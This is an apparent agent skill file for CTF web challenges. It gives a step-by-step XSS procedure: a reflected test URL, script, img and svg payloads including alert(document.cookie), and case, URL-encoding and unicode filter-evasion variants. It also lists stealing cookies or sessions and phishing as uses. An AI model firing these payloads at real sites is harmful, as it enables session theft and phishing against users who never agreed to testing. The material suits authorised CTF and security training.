---
name: ctf-web-xss
description: Cross-Site Scripting (XSS) detection and exploitation
tags: [web, xss, client-side, injection]
prerequisites: [target_url]
---

# CTF Web - XSS Exploitation

## When to Use
Use for:
- Finding reflected/stored XSS
- Stealing cookies/sessions
- Phishing attacks
- Client-side exploitation

## Decision Framework
1. Test for reflection: `' " < >`
2. Identify injection point
3. Determine filter evasion
4. Craft appropriate payload

## Execution Steps

### Step 1: Detection
```
http://target.com/search?q=<script>alert(1)</script>
```

### Step 2: Payload Variations
```javascript
// Basic
<script>alert(document.cookie)</script>

// Image tag
<img src=x onerror=alert(1)>

// SVG
<svg onload=alert(1)>
```

### Step 3: Filter Evasion
```javascript
// Case variation
<ScRiPt>alert(1)</ScRiPt>

// Encoding
%3Cscript%3Ealert(1)%3C/script%3E

// Unicode
\u003cscript\u003ealert(1)\u003c/script\u003e
```

## Expected Output Format
```
XSS Analysis:
  - Type: Reflected/Stored
  - Injection Point: search parameter
  - Payload Successful: Yes
  - Cookie Stealing: Possible
```

## Common Pitfalls
- WAF may block payloads
- CSP headers can prevent execution
- Always test multiple payloads
- Consider context (HTML, JS, attribute)
